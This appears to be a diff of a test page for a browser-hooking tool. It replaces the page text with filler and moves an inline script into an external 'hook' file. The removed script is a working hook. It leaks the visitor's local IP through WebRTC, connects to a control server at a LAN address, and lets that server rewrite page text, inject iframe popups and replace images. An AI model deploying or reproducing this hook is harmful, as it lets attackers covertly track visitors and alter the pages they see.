@@ -1,84 +1,14 @@
 <body>
-The North Norfolk Coast Site of Special Scientific Interest in Norfolk, England, is a Special Protection Area for birds and other wildlife, included in the European Union's Natura 2000 network of protected sites. Its habitats include reed beds, salt marshes, freshwater lagoons, and sand or shingle beaches, across 7,700 ha (19,027 acres) of the county's north coast. The wetlands are important for scarce breeding birds such as pied avocets. The location also attracts rare migrating birds, and ducks and geese winter along this coast in considerable numbers. The area is archaeologically significant, with sites including the mound of an Iron Age fort, a Roman naval port near Brancaster, medieval ruins, and remnants of military use from both world wars. The area attracts many tourists for birdwatching and other outdoor activities. The threat of the sea's encroachment on this soft coast is being met by managed retreat and the creation of new reserves inland. The site is designated as a wetland of international importance, and most of it is a Biosphere Reserve. 
+Bacon ipsum dolor amet tail meatloaf leberkas pork ground round jerky pastrami picanha pork loin landjaeger kevin capicola prosciutto. Sausage fatback short ribs, beef pig t-bone doner filet mignon corned beef porchetta strip steak ball tip. Meatball ribeye tenderloin, drumstick capicola chicken ground round shankle strip steak tongue turkey picanha shank. Chicken tail beef, ground round tongue tenderloin ball tip pancetta kielbasa ribeye boudin turducken short ribs pastrami jerky. Corned beef biltong boudin, flank ground round kielbasa landjaeger sirloin turkey pig jowl beef rump. Brisket turkey spare ribs, bacon tri-tip jerky rump tongue ball tip bresaola corned beef drumstick pig.
+
+Leberkas ham hock shank prosciutto, t-bone pork filet mignon. Tri-tip pancetta t-bone, pig swine spare ribs venison shank short loin chicken ham. Jowl bresaola pork belly venison flank ham spare ribs brisket. Ham cow andouille beef short ribs short loin sausage pig salami.
+<input type="text" name="inneputte">
+<input type="text" name="inneputtee">
 <img src="http://www.w3schools.com/html/pic_mountain.jpg"/>
 <img src="http://www.w3schools.com/html/pic_mountain.jpg"/>
 <img src="http://www.w3schools.com/html/pic_mountain.jpg"/>
 <img src="http://www.w3schools.com/html/pic_mountain.jpg"/>
 </body>
 
-<script>
-/*
-  Include function
-  Includes external js files within a javascript file
-  -> filename: the url to the file
-  -> onload: callback function on the script's load
-*/
-function include(filename, onload) {
-    var head = document.getElementsByTagName('head')[0];
-    var script = document.createElement('script');
-    script.src = filename;
-    script.type = 'text/javascript';
-    script.onload = script.onreadystatechange = function() {
-        if (script.readyState) {
-            if (script.readyState === 'complete' || script.readyState === 'loaded') {
-                script.onreadystatechange = null;                                                  
-                onload();
-            }
-        } 
-        else {
-            onload();          
-        }
-    };
-    head.appendChild(script);
-}
-
-//finding client's local IP (could not find any way to retrieve it with node.. dunno why..)
-var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})
-findIP.then(function(result) {
-
-  //Including jquery in case if the client's webpage does not use it
-  include('http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js', function() {
-      $(document).ready(function() {
-          //Injecting the socket.io script within the client's webpage
-          $.getScript('http://192.168.0.103:5001/socket.io/socket.io.js', function() {
-
-            //Creating client's socket
-            var socket = io("http://192.168.0.103:5001");
-
-            //Sending client's IP to the server
-            socket.emit('client_connected',{"ip":result});
-
-            /*
-              Replace text plugin
-              Replaces text on the client's machine
-              -> original: the string to be replace
-              -> replacement: the replacement string
-            */
-            socket.on('replaceText',function(data){
-                original = new RegExp(data.original,"g");
-                document.body.innerHTML = document.body.innerHTML.replace(original,data.replacement);
-            });
-
-            /*
-              Display popup plugin
-              Displays a popup on the client's machine
-              -> htmlPopup: the html definition of the popup
-            */
-            socket.on('displayPopup',function(data){
-                $('body').append('<iframe style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:50%;height:50%;background:transparent;border:none;" id="terminal" src="'+data.link+'"></iframe>'); 
-            });
-
-            socket.on('replaceImages',function(data){
-              var imgs = document.getElementsByTagName("img");
-              for(var i=0, l=imgs.length;i<l;i++){
-                imgs[i].src = data.link;
-              }
-            });
-
-
-          });
-      });
-  });
-});
-</script>
+<script src="hook/pnsmn.js"></script>
 
